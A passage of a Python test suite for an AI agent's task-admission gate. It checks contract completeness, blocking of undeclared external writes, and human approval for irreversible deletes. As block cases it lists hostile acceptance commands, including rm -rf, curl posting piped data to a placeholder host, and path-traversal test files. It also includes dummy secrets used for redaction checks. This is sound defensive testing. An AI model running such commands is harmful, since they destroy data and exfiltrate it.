"""任務契約閘門的純核心行為測試。"""

from __future__ import annotations

import asyncio
import json
import multiprocessing
import time
from pathlib import Path

import pytest

from studio.task_admission import (
    build_local_context,
    decision_record,
    evaluate,
    evaluate_with_semantic_fallback,
    read_local_repo_sha,
)


def _semantic_process_worker(cache_dir, repo_root, calls, gate, queue):
    """跨行程 cache 競態 worker；必須維持 module-level 供 multiprocessing 使用。"""
    from studio import task_admission

    original = task_admission._model_contract

    def slow_validate(value):
        time.sleep(0.25)
        return original(value)

    task_admission._model_contract = slow_validate

    async def resolver(_payload):
        with calls.get_lock():
            calls.value += 1
        await asyncio.sleep(0.05)
        return {
            "contract": {
                "version": 1,
                "outcome": "跨行程只補全一次且兩邊取得同一終態",
                "kind": "implementation",
                "targets": ["studio/target.py"],
                "acceptance": ["pytest tests pass", "reviewable diff"],
            }
        }

    gate.wait(timeout=10)
    decision, meta = asyncio.run(
        task_admission.evaluate_with_semantic_fallback(
            {
                "id": 8307,
                "title": "終態寫入競爭",
                "source": "manual",
                "risk": "low",
            },
            {"root": repo_root, "repo_sha": "2" * 40},
            "claim",
            resolver=resolver,
            cache_dir=cache_dir,
            timeout_s=1,
        )
    )
    queue.put(
        (
            decision.outcome,
            meta["cache_hit"],
            meta["model_calls"],
            meta["error"],
        )
    )


def test_complete_implementation_contract_is_ready():
    task = {
        "id": 41,
        "title": "修復 backlog 的同級派工順序",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "同級任務依來源優先序穩定出列",
            "kind": "implementation",
            "targets": ["studio/backlog.py"],
            "acceptance": [
                "python3 -m pytest tests/autopilot/test_backlog_triage.py -q",
                "git diff --check 且產出可審查的程式碼 diff",
            ],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": {"studio/backlog.py"}, "repo_sha": "a" * 40},
        "claim",
    )

    assert decision.outcome == "ready"
    assert decision.contract.to_dict() == {
        "version": 1,
        "outcome": "同級任務依來源優先序穩定出列",
        "kind": "implementation",
        "targets": ["studio/backlog.py"],
        "acceptance": [
            "python3 -m pytest tests/autopilot/test_backlog_triage.py -q",
            "git diff --check 且產出可審查的程式碼 diff",
        ],
        "constraints": [],
        "external_writes": [],
    }
    assert decision.reasons == ()


def test_legacy_task_is_normalized_and_missing_contract_fields_need_clarification():
    task = {
        "id": 42,
        "title": "修復重複派工",
        "detail": "相同工作不得同時被兩個 worker 認領",
        "type": "bug",
        "risk": "low",
    }

    decision = evaluate(task, {"known_targets": set()}, "enqueue")

    assert decision.outcome == "needs_clarification"
    assert decision.contract.version == 1
    assert decision.contract.outcome == "相同工作不得同時被兩個 worker 認領"
    assert decision.contract.kind == "implementation"
    assert decision.missing_fields == ("targets", "acceptance")
    assert decision.reasons == ("contract_fields_missing",)


def test_pure_investigation_is_routed_without_becoming_implementation():
    task = {
        "id": 43,
        "title": "調查 autopilot timeout 的根因並回報",
        "detail": "釐清 watchdog 是否涵蓋 clone 階段",
        "type": "improvement",
        "risk": "low",
        "targets": ["studio/autopilot.py"],
        "acceptance": ["交付結論、證據來源與需不需要改碼判定"],
    }

    decision = evaluate(
        task,
        {"known_targets": ["studio/autopilot.py"]},
        "claim",
    )

    assert decision.outcome == "investigation"
    assert decision.contract.kind == "investigation"
    assert decision.reasons == ("investigation_lane",)


def test_implementation_requires_test_and_reviewable_artifact():
    task = {
        "id": 51,
        "title": "修復 admission cache",
        "risk": "low",
        "contract": {
            "version": 1,
            "outcome": "cache key 在 repo 變更時失效",
            "kind": "implementation",
            "targets": ["studio/task_admission.py"],
            "acceptance": ["python3 -m pytest tests/autopilot/test_task_admission.py -q"],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["studio/task_admission.py"]},
        "claim",
    )

    assert decision.outcome == "needs_clarification"
    assert decision.reasons == ("acceptance_evidence_missing",)
    assert decision.missing_fields == ("acceptance.artifact",)


def test_ops_requires_health_or_dry_run_and_rollback_evidence():
    task = {
        "id": 52,
        "title": "切換 worker 設定",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "worker 使用新設定且服務健康",
            "kind": "ops",
            "targets": ["studio/config.py"],
            "acceptance": ["health check 回傳 healthy"],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["studio/config.py"]},
        "claim",
    )

    assert decision.outcome == "needs_clarification"
    assert decision.missing_fields == ("acceptance.rollback",)


def test_unsupported_contract_version_or_kind_needs_clarification():
    task = {
        "id": 53,
        "title": "更新說明",
        "risk": "low",
        "contract": {
            "version": 9,
            "outcome": "說明與現況一致",
            "kind": "mystery",
            "targets": ["README.md"],
            "acceptance": ["靜態內容檢查確認必要章節存在"],
        },
    }

    decision = evaluate(task, {"known_targets": ["README.md"]}, "claim")

    assert decision.outcome == "needs_clarification"
    assert decision.reasons == ("contract_schema_invalid",)
    assert decision.missing_fields == ("version", "kind")


def test_active_duplicate_closes_as_no_change_before_contract_clarification():
    task = {
        "id": 44,
        "title": "修復重複派工",
        "detail": "避免 worker 重複認領",
        "type": "bug",
    }
    context = {
        "active_tasks": [
            {"id": 7, "title": "  修復重複派工  ", "status": "in_progress"},
        ]
    }

    decision = evaluate(task, context, "enqueue")

    assert decision.outcome == "no_change"
    assert decision.reasons == ("duplicate_active",)
    assert decision.missing_fields == ()


def test_recently_completed_duplicate_closes_as_no_change():
    task = {
        "id": 45,
        "title": "新增 admission audit",
        "type": "feature",
    }
    context = {
        "recent_done_tasks": [
            {"id": 5, "title": "新增 admission audit", "status": "done"},
        ]
    }

    decision = evaluate(task, context, "enqueue")

    assert decision.outcome == "no_change"
    assert decision.reasons == ("already_done",)


def test_external_write_without_scoped_authorization_is_blocked():
    task = {
        "id": 46,
        "title": "更新 GitHub issue 標籤",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "issue 具備正確的分類標籤",
            "kind": "ops",
            "targets": ["github:issue:472"],
            "acceptance": ["重新讀取 issue 並確認標籤集合"],
            "external_writes": ["github:issue:update"],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["github:issue:472"], "authorized_external_writes": []},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("external_write_not_authorized",)


def test_external_target_without_adapter_evidence_is_safety_block():
    task = {
        "id": 460,
        "title": "更新 GitHub issue 標籤",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "issue 具備正確的分類標籤",
            "kind": "ops",
            "targets": ["github:issue:472"],
            "acceptance": ["dry-run health check", "rollback drill"],
            "external_writes": ["github:issue:update"],
        },
    }

    decision = evaluate(
        task,
        {"authorized_external_writes": ["github:issue:update"]},
        "claim",
    )
    record = decision_record(decision, task, mode="enforce", phase="claim")

    assert decision.outcome == "blocked"
    assert decision.reasons == ("external_target_evidence_missing",)
    assert record["overridable"] is False


def test_external_mutation_intent_must_be_declared_in_contract():
    task = {
        "id": 461,
        "title": "Deploy production service",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "production deployment is live",
            "kind": "ops",
            "targets": ["service:production"],
            "acceptance": ["dry-run health check", "rollback drill"],
            "external_writes": [],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["service:production"]},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("external_write_not_declared",)


@pytest.mark.parametrize(
    ("title", "target"),
    [
        ("Merge PR #42", "github:pr:42"),
        ("更新 GitHub issue 標籤", "github:issue:42"),
        ("發佈 production 套件", "registry:production"),
        ("Sync remote branch", "github:branch:main"),
        ("Comment on GitHub issue", "github:issue:42"),
        ("Ship package to production", "registry:production"),
        ("同步遠端分支", "github:branch:main"),
    ],
)
def test_external_mutation_variants_cannot_omit_declaration(title, target):
    decision = evaluate(
        {
            "id": 463,
            "title": title,
            "risk": "medium",
            "contract": {
                "version": 1,
                "outcome": f"{target} 已更新",
                "kind": "ops",
                "targets": [target],
                "acceptance": ["dry-run health check", "rollback drill"],
                "external_writes": [],
            },
        },
        {"known_targets": [target]},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("external_write_not_declared",)


@pytest.mark.parametrize(
    "title",
    [
        "Deploy web app",
        "Please publish the documentation site",
        "Ship the package",
        "Send the report",
        "Post a customer comment",
        "Can you deploy web app?",
        "Could you publish the documentation site?",
        "Would you send the report?",
        "I need you to deploy web app",
        "Fix the bug, deploy the web app",
        "Implement the feature, publish the documentation site",
        "Add tests / deploy web app",
        "Redeploy the web app",
        "Republish the documentation site",
        "Resend the report",
        "Email the report to the customer",
        "Run a deployment to production",
        "Perform a deployment to production",
        "Schedule a deployment to production",
        "Open a PR",
        "Raise a pull request",
        "Submit a PR",
        "Approve PR #42",
        "File a GitHub issue",
        "Remove a GitHub issue",
        "Reopen PR #42",
        "Assign PR #42 to Alice",
        "Request review on PR #42",
        "Add a label to GitHub issue #42",
        "Star the GitHub repository",
        "Fork the GitHub repository",
        "Invite Alice to the GitHub repository",
        "Cancel the GitHub workflow",
        "Rerun the GitHub workflow",
        "Scale production cluster",
        "Change production DNS record",
        "Rotate production secret",
        "Call customer webhook",
        "Forward the report to the customer",
        "Reply to the customer",
        "Please update production service",
        "Can you update the remote branch?",
        "Please create a new branch",
        "Could you close the remote branch?",
        "Please create a GitHub release",
        "同步備份",
        "部署網站",
        "傳送報告",
        "幫我部署網站",
        "修復錯誤，部署網站",
        "測試完成後部署網站",
        "發送報告給客戶",
    ],
)
def test_outbound_action_with_only_local_target_still_requires_declaration(title):
    decision = evaluate(
        {
            "id": 465,
            "title": title,
            "risk": "low",
            "contract": {
                "version": 1,
                "outcome": title,
                "kind": "implementation",
                "targets": ["studio/task_admission.py"],
                "acceptance": ["pytest tests pass", "reviewable diff"],
                "external_writes": [],
            },
        },
        {"known_targets": ["studio/task_admission.py"]},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("external_write_not_declared",)


@pytest.mark.parametrize(
    "title",
    [
        "修復 GitHub deploy client 的重試邏輯",
        "Fix the deploy client retry logic",
        "Add a deploy button",
        "Document how to deploy locally",
        "Improve deploy client retry logic",
        "Harden deploy client retry logic",
        "Optimize deploy client retry logic",
        "Rename the deploy button",
        "Review deploy client retry logic",
        "Support deploy client retry logic",
        "改善部署客戶端重試邏輯",
        "強化部署客戶端重試邏輯",
        "優化部署客戶端重試邏輯",
        "重新命名部署按鈕",
        "為部署客戶端加入單元測試",
        "Show deploy status in local dashboard",
        "Display deploy status in local dashboard",
        "Deploy client retry logic",
        "deploy-client retry logic",
        "部署客戶端重試邏輯",
        "Avoid deploying the web app",
        "修復完成，請勿部署網站",
        "Implement a button to open a PR",
        "Document how to submit a PR",
        "Create PR parser",
        "Close button for PR dialog",
        "File issue parser",
        "Deploy client: improve retries",
        "Update PR status parser",
        "Rerun GitHub workflow locally in a mock",
    ],
)
def test_local_implementation_about_deploy_is_not_misclassified_as_external_write(title):
    decision = evaluate(
        {
            "id": 464,
            "title": title,
            "risk": "low",
            "contract": {
                "version": 1,
                "outcome": f"{title} 的本機測試穩定通過",
                "kind": "implementation",
                "targets": ["studio/task_admission.py"],
                "acceptance": ["pytest tests pass", "reviewable diff"],
                "external_writes": [],
            },
        },
        {"known_targets": ["studio/task_admission.py"]},
        "claim",
    )

    assert decision.outcome == "ready"


@pytest.mark.parametrize(
    ("title", "detail"),
    [
        ("Do not", "deploy the web app"),
        (
            "Add a deployment guardrail",
            "Deploy web app only after approval",
        ),
    ],
)
def test_external_detector_preserves_negation_and_local_guardrail_context(title, detail):
    decision = evaluate(
        {
            "id": 466,
            "title": title,
            "detail": detail,
            "risk": "low",
            "contract": {
                "version": 1,
                "outcome": "本機 guardrail 與測試完成",
                "kind": "implementation",
                "targets": ["studio/task_admission.py"],
                "acceptance": ["pytest tests pass", "reviewable diff"],
                "external_writes": [],
            },
        },
        {"known_targets": ["studio/task_admission.py"]},
        "claim",
    )

    assert decision.outcome == "ready"


def test_irreversible_intent_cannot_hide_behind_medium_risk_label():
    task = {
        "id": 462,
        "title": "Delete production database permanently",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "production database is permanently deleted",
            "kind": "ops",
            "targets": ["database:production"],
            "acceptance": ["dry-run health check", "rollback drill"],
            "external_writes": ["database:delete"],
        },
    }

    decision = evaluate(
        task,
        {
            "known_targets": ["database:production"],
            "authorized_external_writes": ["database:delete"],
        },
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("irreversible_intent_not_approved",)


@pytest.mark.parametrize(
    "title",
    [
        "Remove production database",
        "Erase production history",
        "移除正式資料庫",
    ],
)
def test_irreversible_intent_synonyms_require_human_approval(title):
    decision = evaluate(
        {
            "id": 4621,
            "title": title,
            "risk": "medium",
            "contract": {
                "version": 1,
                "outcome": f"{title} completed",
                "kind": "ops",
                "targets": ["database:production"],
                "acceptance": ["dry-run health check", "rollback drill"],
                "external_writes": ["database:delete"],
            },
        },
        {
            "known_targets": ["database:production"],
            "authorized_external_writes": ["database:delete"],
        },
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("irreversible_intent_not_approved",)


def test_irreversible_risk_without_human_authorization_is_blocked():
    task = {
        "id": 47,
        "title": "永久刪除歷史資料",
        "risk": "irreversible",
        "contract": {
            "version": 1,
            "outcome": "過期資料不可再被查詢",
            "kind": "ops",
            "targets": ["history:expired"],
            "acceptance": ["查詢過期資料回傳空集合"],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["history:expired"], "human_approved": False},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("risk_not_authorized",)


def test_unknown_target_cannot_be_admitted_as_ready():
    task = {
        "id": 48,
        "title": "修復不存在的 adapter",
        "risk": "low",
        "contract": {
            "version": 1,
            "outcome": "adapter 能處理 repo 證據",
            "kind": "implementation",
            "targets": ["studio/missing_adapter.py"],
            "acceptance": ["python3 -m pytest tests/autopilot/test_missing_adapter.py -q"],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["studio/backlog.py"]},
        "claim",
    )

    assert decision.outcome == "needs_clarification"
    assert decision.reasons == ("target_not_found",)
    assert decision.unresolved_targets == ("studio/missing_adapter.py",)


def test_unsafe_acceptance_command_is_blocked():
    task = {
        "id": 49,
        "title": "清理測試產物",
        "risk": "low",
        "contract": {
            "version": 1,
            "outcome": "測試產物已清除",
            "kind": "implementation",
            "targets": ["tests/artifacts/"],
            "acceptance": [{"command": "rm -rf /root/.codex/Ti"}],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["tests/artifacts/"]},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("unsafe_acceptance_command",)


@pytest.mark.parametrize(
    "command",
    [
        "make test && rm -rf /tmp/x",
        "npm test; curl -X POST https://example.invalid",
        "echo test; rm -rf /tmp/x",
        'env FOO=test sh -c "rm -rf /tmp/x"',
        "curl --data payload https://example.invalid",
        "echo payload | curl --data @- https://example.invalid",
        "env RELEASE=1 make publish",
        "tee /etc/ti-release",
        "git -c credential.helper= push origin HEAD",
        "gh --repo owner/repo pr merge 42",
        "curl --request=POST https://example.invalid",
        "pytest tests\n./scripts/publish production",
        "pytest tests\npython3 scripts/release.py",
        "FOO=bar ./scripts/publish production",
        "PYTHONPATH=/tmp pytest tests -q",
        "./scripts/publish production",
        "pytest /tmp/evil_test.py",
        "pytest foo/../../tmp/evil_test.py",
        "nox -s release",
        "tox -e publish",
        "rg --pre ./scripts/publish pattern",
        "go test -exec ./scripts/publish ./...",
        "git diff --output=/tmp/ti-audit",
        "cargo test --target-dir /tmp/ti-out",
    ],
)
def test_unsafe_acceptance_cannot_hide_behind_command_wrappers(command):
    task = {
        "id": 491,
        "title": "驗證 wrapper 安全",
        "risk": "low",
        "contract": {
            "version": 1,
            "outcome": "wrapper 不得執行破壞操作",
            "kind": "implementation",
            "targets": ["studio/task_admission.py"],
            "acceptance": [command, "產出可審查 diff"],
        },
    }

    decision = evaluate(
        task,
        {"known_targets": ["studio/task_admission.py"]},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("unsafe_acceptance_command",)


@pytest.mark.parametrize(
    "command",
    [
        {"command": "custom-release --prod"},
        "custom-release --prod",
        "python3 scripts/release.py",
        "bash scripts/release.sh",
    ],
)
def test_unknown_or_arbitrary_acceptance_command_fails_closed(command):
    decision = evaluate(
        {
            "id": 492,
            "title": "驗證自訂 acceptance command",
            "risk": "low",
            "contract": {
                "version": 1,
                "outcome": "只執行可判定為本機唯讀或測試的驗收",
                "kind": "implementation",
                "targets": ["studio/task_admission.py"],
                "acceptance": [
                    command,
                    "pytest tests pass",
                    "reviewable diff",
                ],
            },
        },
        {"known_targets": ["studio/task_admission.py"]},
        "claim",
    )

    assert decision.outcome == "blocked"
    assert decision.reasons == ("unsafe_acceptance_command",)


def test_decision_is_json_serializable_and_audit_does_not_copy_secrets():
    secret = "ghp_do-not-copy-this-token"
    task = {
        "id": 50,
        "title": "修復 admission cache",
        "risk": "low",
        "contract": {
            "version": 1,
            "outcome": "相同契約不重複評估",
            "kind": "implementation",
            "targets": ["studio/task_admission.py"],
            "acceptance": [
                "python3 -m pytest tests/autopilot/test_task_admission.py -q",
                "git diff --check 且產出可審查的程式碼 diff",
            ],
            "constraints": [f"測試憑證={secret}"],
        },
    }
    context = {
        "known_targets": ["studio/task_admission.py"],
        "repo_sha": "b" * 40,
        "evidence": [
            {
                "kind": "target_exists",
                "target": "studio/task_admission.py",
                "detail": secret,
            }
        ],
    }

    decision = evaluate(task, context, "claim")
    encoded = json.dumps(decision.to_dict(), ensure_ascii=False)
    audit_encoded = json.dumps(decision.audit, ensure_ascii=False)

    assert json.loads(encoded)["outcome"] == "ready"
    assert decision.audit["schema_version"] == 1
    assert decision.audit["task_id"] == 50
    assert decision.audit["contract_version"] == 1
    assert len(decision.audit["contract_hash"]) == 64
    assert decision.audit["repo_sha"] == "b" * 40
    assert decision.audit["phase"] == "claim"
    assert decision.audit["outcome"] == "ready"
    assert decision.audit["rule_ids"] == ["ready"]
    assert decision.audit["evidence_summary"] == {"known_target_count": 1}
    assert secret not in audit_encoded


def test_local_context_only_accepts_targets_proven_inside_repo(tmp_path: Path):
    (tmp_path / "studio").mkdir()
    (tmp_path / "studio" / "exists.py").write_text("", encoding="utf-8")
    task = {
        "id": 60,
        "title": "修復 adapter",
        "contract": {
            "version": 1,
            "outcome": "adapter 可用",
            "kind": "implementation",
            "targets": [
                "studio/exists.py",
                "studio/missing.py",
                "../outside.txt",
                "github:issue:472",
            ],
            "acceptance": ["pytest", "reviewable diff"],
        },
    }

    context = build_local_context(
        task,
        {
            "root": tmp_path,
            "repo_sha": "c" * 40,
            "known_targets": ["github:issue:472"],
        },
        tasks=[task, {"id": 8, "title": "其他任務", "status": "pending"}],
    )

    assert set(context["known_targets"]) == {
        "studio/exists.py",
        "github:issue:472",
    }
    assert set(context["missing_targets"]) == {
        "studio/missing.py",
        "../outside.txt",
    }
    assert context["repo_sha"] == "c" * 40


def test_read_local_repo_sha_resolves_symbolic_head_without_git_process(tmp_path: Path):
    git_dir = tmp_path / ".git"
    (git_dir / "refs" / "heads").mkdir(parents=True)
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    (git_dir / "refs" / "heads" / "main").write_text("e" * 40 + "\n", encoding="utf-8")

    assert read_local_repo_sha(tmp_path) == "e" * 40


def test_read_local_repo_sha_resolves_linked_worktree_commondir(tmp_path: Path):
    repo = tmp_path / "linked"
    common_git = tmp_path / "main" / ".git"
    worktree_git = common_git / "worktrees" / "linked"
    repo.mkdir()
    worktree_git.mkdir(parents=True)
    (common_git / "refs" / "heads").mkdir(parents=True)
    (repo / ".git").write_text(f"gitdir: {worktree_git}\n", encoding="utf-8")
    (worktree_git / "HEAD").write_text("ref: refs/heads/feature\n", encoding="utf-8")
    (worktree_git / "commondir").write_text("../..\n", encoding="utf-8")
    (common_git / "refs" / "heads" / "feature").write_text(
        "f" * 40 + "\n",
        encoding="utf-8",
    )

    assert read_local_repo_sha(repo) == "f" * 40


def test_decision_record_is_source_aware_and_scoped():
    manual = {
        "id": 61,
        "title": "改善派工",
        "source": "manual",
        "risk": "low",
        "type": "improvement",
    }
    decision = evaluate(manual, {}, "claim")

    record = decision_record(
        decision,
        manual,
        mode="enforce",
        phase="claim",
        evaluated_at=123.0,
    )

    assert record["outcome"] == "needs_clarification"
    assert record["needs_human"] is True
    assert record["overridable"] is True
    assert record["question"]
    assert record["recommendation"]
    assert record["timeout_default"] == "investigation"
    assert len(record["scope_hash"]) == 64
    assert record["evaluated_at"] == 123.0

    automated = {**manual, "id": 62, "source": "discovered"}
    automatic_record = decision_record(
        evaluate(automated, {}, "claim"),
        automated,
        mode="enforce",
        phase="claim",
        evaluated_at=123.0,
    )
    assert automatic_record["needs_human"] is False
    assert automatic_record["question"] == ""
    assert automatic_record["timeout_default"] == "park"
    assert automatic_record["scope_hash"] != record["scope_hash"]

    for task_id, source in ((64, "intent"), (65, "schedule")):
        system_task = {**manual, "id": task_id, "source": source}
        system_record = decision_record(
            evaluate(system_task, {}, "claim"),
            system_task,
            mode="enforce",
            phase="claim",
            evaluated_at=123.0,
        )
        assert system_record["needs_human"] is False
        assert system_record["question"] == ""
        assert system_record["timeout_default"] == "park"


def test_safety_block_is_never_overridable():
    task = {
        "id": 63,
        "title": "推送外部資料",
        "source": "manual",
        "risk": "medium",
        "contract": {
            "version": 1,
            "outcome": "外部資料已更新",
            "kind": "ops",
            "targets": ["service:external"],
            "acceptance": ["dry-run health check", "rollback 演練"],
            "external_writes": ["external:update"],
        },
    }
    decision = evaluate(
        task,
        {"known_targets": ["service:external"], "repo_sha": "d" * 40},
        "claim",
    )

    record = decision_record(
        decision,
        task,
        mode="enforce",
        phase="claim",
        evaluated_at=123.0,
    )

    assert record["outcome"] == "blocked"
    assert record["overridable"] is False


@pytest.mark.asyncio
async def test_semantic_fallback_calls_once_and_caches_by_contract_and_repo_sha(tmp_path: Path):
    (tmp_path / "studio").mkdir()
    (tmp_path / "studio" / "target.py").write_text("", encoding="utf-8")
    task = {
        "id": 70,
        "title": "修復目標",
        "detail": "讓排序穩定",
        "source": "manual",
        "risk": "low",
        "type": "bug",
    }
    calls = 0

    async def resolver(_payload):
        nonlocal calls
        calls += 1
        return {
            "contract": {
                "version": 1,
                "outcome": "排序在相同輸入下穩定",
                "kind": "implementation",
                "targets": ["studio/target.py"],
                "acceptance": ["pytest tests -q", "reviewable diff"],
            },
            "model": "fast-test",
            "token_usage": {"input": 10, "output": 20},
        }

    first, first_meta = await evaluate_with_semantic_fallback(
        task,
        {"root": tmp_path, "repo_sha": "a" * 40},
        "claim",
        resolver=resolver,
        cache_dir=tmp_path / "cache",
    )
    second, second_meta = await evaluate_with_semantic_fallback(
        task,
        {"root": tmp_path, "repo_sha": "a" * 40},
        "claim",
        resolver=resolver,
        cache_dir=tmp_path / "cache",
    )

    assert first.outcome == second.outcome == "ready"
    assert calls == 1
    assert first_meta["cache_hit"] is False
    assert second_meta["cache_hit"] is True
    assert first_meta["model"] == "fast-test"
    assert first_meta["token_usage"] == {"input": 10, "output": 20}


@pytest.mark.asyncio
async def test_semantic_cache_separates_tasks_with_same_incomplete_contract(tmp_path: Path):
    (tmp_path / "studio").mkdir()
    (tmp_path / "studio" / "a.py").write_text("", encoding="utf-8")
    (tmp_path / "studio" / "b.py").write_text("", encoding="utf-8")
    shared_contract = {
        "version": 1,
        "outcome": "完成指定修復",
        "kind": "implementation",
        "targets": [],
        "acceptance": ["pytest tests -q", "reviewable diff"],
    }
    calls = []

    async def resolver(payload):
        calls.append(payload["task_id"])
        target = "studio/a.py" if payload["task_id"] == 81 else "studio/b.py"
        return {"contract": {**shared_contract, "targets": [target]}}

    decisions = []
    for task_id, title in ((81, "修復 A"), (82, "修復 B")):
        decision, _meta = await evaluate_with_semantic_fallback(
            {
                "id": task_id,
                "title": title,
                "source": "manual",
                "risk": "low",
                "contract": shared_contract,
            },
            {"root": tmp_path, "repo_sha": "a" * 40},
            "claim",
            resolver=resolver,
            cache_dir=tmp_path / "cache",
        )
        decisions.append(decision)

    assert calls == [81, 82]
    assert [decision.contract.targets for decision in decisions] == [
        ("studio/a.py",),
        ("studio/b.py",),
    ]


@pytest.mark.asyncio
async def test_concurrent_same_scope_uses_one_semantic_resolver_call(tmp_path: Path):
    task = {
        "id": 83,
        "title": "補全同一任務",
        "source": "manual",
        "risk": "low",
    }
    calls = 0

    async def resolver(_payload):
        nonlocal calls
        calls += 1
        await asyncio.sleep(0.01)
        return {"contract": {}}

    await asyncio.gather(
        *(
            evaluate_with_semantic_fallback(
                task,
                {"root": tmp_path, "repo_sha": "b" * 40},
                "claim",
                resolver=resolver,
                cache_dir=tmp_path / "cache",
            )
            for _ in range(2)
        )
    )

    assert calls == 1


def test_semantic_terminal_write_stays_inside_cross_process_lock(tmp_path: Path):
    (tmp_path / "studio").mkdir()
    (tmp_path / "studio" / "target.py").write_text("", encoding="utf-8")
    process_context = multiprocessing.get_context("spawn")
    calls = process_context.Value("i", 0)
    gate = process_context.Barrier(2)
    queue = process_context.Queue()
    processes = [
        process_context.Process(
            target=_semantic_process_worker,
            args=(tmp_path / "cache", tmp_path, calls, gate, queue),
        )
        for _ in range(2)
    ]

    for process in processes:
        process.start()
    for process in processes:
        process.join(10)
    for process in processes:
        if process.is_alive():
            process.terminate()
            process.join(2)

    assert [process.exitcode for process in processes] == [0, 0]
    rows = [queue.get(timeout=2) for _ in processes]
    assert calls.value == 1
    assert sorted((row[1], row[2]) for row in rows) == [(False, 1), (True, 0)]
    assert all(row[0] == "ready" and row[3] == "" for row in rows)


@pytest.mark.asyncio
async def test_semantic_fallback_can_repair_invalid_contract_schema(tmp_path: Path):
    (tmp_path / "studio").mkdir()
    (tmp_path / "studio" / "target.py").write_text("", encoding="utf-8")
    task = {
        "id": 72,
        "title": "修復 schema typo",
        "source": "discovered",
        "risk": "low",
        "contract": {
            "version": 99,
            "outcome": "排序穩定",
            "kind": "impl",
            "targets": ["studio/target.py"],
            "acceptance": ["pytest tests -q", "reviewable diff"],
        },
    }
    calls = 0

    async def resolver(_payload):
        nonlocal calls
        calls += 1
        return {
            "contract": {
                "version": 1,
                "outcome": "排序穩定",
                "kind": "implementation",
                "targets": ["studio/target.py"],
                "acceptance": ["pytest tests -q", "reviewable diff"],
            }
        }

    decision, meta = await evaluate_with_semantic_fallback(
        task,
        {"root": tmp_path, "repo_sha": "a" * 40},
        "claim",
        resolver=resolver,
        cache_dir=tmp_path / "cache",
    )

    assert calls == 1
    assert meta["model_calls"] == 1
    assert decision.outcome == "ready"


@pytest.mark.asyncio
async def test_semantic_resolver_payload_sanitizes_entire_current_contract(tmp_path: Path):
    captured = []

    async def resolver(payload):
        captured.append(payload)
        return {"contract": {}}

    tasks = [
        {
            "id": 73,
            "title": "補全 detail",
            "detail": "token=DETAIL_SECRET_VALUE",
            "source": "manual",
            "risk": "low",
        },
        {
            "id": 74,
            "title": "補全 explicit contract",
            "source": "manual",
            "risk": "low",
            "contract": {
                "version": 1,
                "outcome": "修復登入",
                "kind": "implementation",
                "targets": [],
                "acceptance": ["pytest tests -q", "reviewable diff"],
                "constraints": [
                    "token=CONTRACT_SECRET_VALUE",
                    "只讀 https://alice:hunter2@example.invalid/path",
                ],
                "external_writes": [],
            },
        },
    ]
    for index, task in enumerate(tasks):
        await evaluate_with_semantic_fallback(
            task,
            {"root": tmp_path, "repo_sha": f"{index + 1}" * 40},
            "claim",
            resolver=resolver,
            cache_dir=tmp_path / f"cache-{index}",
        )

    encoded = json.dumps(captured, ensure_ascii=False)
    assert "DETAIL_SECRET_VALUE" not in encoded
    assert "CONTRACT_SECRET_VALUE" not in encoded
    assert "alice:hunter2@" not in encoded
    assert encoded.count("[REDACTED]") >= 3


@pytest.mark.asyncio
async def test_semantic_fallback_timeout_stays_fail_closed(tmp_path: Path):
    task = {
        "id": 71,
        "title": "修復模糊問題",
        "source": "manual",
        "risk": "low",
        "type": "bug",
    }

    async def slow_resolver(_payload):
        await asyncio.sleep(1)
        return {"contract": {}}

    decision, meta = await evaluate_with_semantic_fallback(
        task,
        {"root": tmp_path, "repo_sha": "b" * 40},
        "claim",
        resolver=slow_resolver,
        cache_dir=tmp_path / "cache",
        timeout_s=0.01,
    )

    assert decision.outcome == "needs_clarification"
    assert meta["error"] == "timeout"
    assert meta["model_calls"] == 1


@pytest.mark.asyncio
async def test_semantic_fallback_requires_known_repo_sha(tmp_path: Path):
    calls = 0

    async def resolver(_payload):
        nonlocal calls
        calls += 1
        return {"contract": {}}

    decision, meta = await evaluate_with_semantic_fallback(
        {
            "id": 76,
            "title": "SHA 未知時不可建立可跨版本誤用的 cache",
            "source": "manual",
            "risk": "low",
        },
        {"root": tmp_path},
        "claim",
        resolver=resolver,
        cache_dir=tmp_path / "cache",
    )

    assert calls == 0
    assert decision.outcome == "needs_clarification"
    assert meta["error"] == "repo_sha_unknown"


@pytest.mark.asyncio
async def test_semantic_cache_prewrite_failure_does_not_call_or_release_model_result(
    tmp_path: Path,
    monkeypatch,
):
    from studio import secure_write

    (tmp_path / "studio").mkdir()
    (tmp_path / "studio" / "target.py").write_text("", encoding="utf-8")
    task = {
        "id": 75,
        "title": "補全快取失敗案例",
        "source": "manual",
        "risk": "low",
    }
    calls = 0

    async def resolver(_payload):
        nonlocal calls
        calls += 1
        return {
            "contract": {
                "version": 1,
                "outcome": "快取失敗時仍維持安全",
                "kind": "implementation",
                "targets": ["studio/target.py"],
                "acceptance": ["pytest tests -q", "reviewable diff"],
            }
        }

    monkeypatch.setattr(
        secure_write,
        "secure_write_root",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("disk unavailable")),
    )

    decision, meta = await evaluate_with_semantic_fallback(
        task,
        {"root": tmp_path, "repo_sha": "c" * 40},
        "claim",
